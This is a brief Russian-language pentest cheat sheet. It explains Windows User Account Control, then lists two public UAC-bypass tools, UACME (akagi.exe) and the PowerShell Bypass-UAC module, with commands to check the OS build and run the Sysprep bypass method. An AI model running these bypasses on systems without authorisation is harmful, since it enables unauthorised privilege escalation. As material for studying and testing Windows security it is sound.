#windows #AD #uac #bypass #privillage #lpe 

> **Контроль учетных записей пользователей (UAC)** — это функция, позволяющая запрашивать согласие на выполнение действий с расширенными правами

<span style="background:rgba(205, 244, 105, 0.55)">Когда включен UAC</span>, приложения и задачи всегда работают в контексте безопасности учетной записи, не являющейся администраторской, если только администратор явно не разрешит этим приложениям/задачам доступ к системе на уровне администратора

<font color="#92d050">Это удобная функция, которая защищает администраторов от непреднамеренных изменений, но не считается границей безопасности.</font>

# UAC Bypass

Используем инстурмент *akagi.exe*

## Оглавление
- [[#1) [UACME](https://github.com/hfiref0x/UACME)]]
  - [[#Как работать]]
- [[#2) [Bypass-UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)]]

---

## 1) [UACME](https://github.com/hfiref0x/UACME)

### Как работать 

#### 1) Определяем билд Windows 
```powershell
[environment]::OSVersion.Version
```

#### 2) Сопоставляем с версией на странице

[Versions](https://en.wikipedia.org/wiki/Windows_10_version_history)

#### 3) В UACME смотрим метод к которому уязвим наш билд Windows


## 2) [Bypass-UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)  

```powershell
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```